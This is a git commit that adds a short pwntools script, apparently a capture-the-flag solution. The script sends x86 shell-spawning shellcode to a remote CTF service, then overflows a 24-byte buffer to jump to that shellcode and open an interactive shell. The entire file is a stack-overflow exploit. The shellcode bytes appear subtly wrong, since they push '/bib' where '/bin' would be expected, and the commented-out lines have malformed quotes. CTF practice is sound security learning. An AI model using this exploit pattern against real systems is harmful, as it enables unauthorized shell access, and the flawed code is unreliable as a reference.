af9e58425ea6dc0e04a2a64f81dd9b66de037b3a
cokia <hwymaster01@gmail.com>
2019-06-09 15:13:32 +0900

    edit error

---
+++ 2019-06/week-of-2/pwntools-prob1.py
@@ -0,0 +1,14 @@
+from pwn import *
+#p = process(""./prob1")
+#e = ELF(""./prob1")
+r = remote("ctf.j0n9hyun.xyz",3003)
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x62\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
+nameaddr = 0x804a060
+r.recvuntil("Name :")
+payload = shellcode
+r.sendline(shellcode)
+r.recvuntil("input :")
+payload = "A"*24
+payload += p32(nameaddr)
+r.sendline(payload)
+r.interactive()
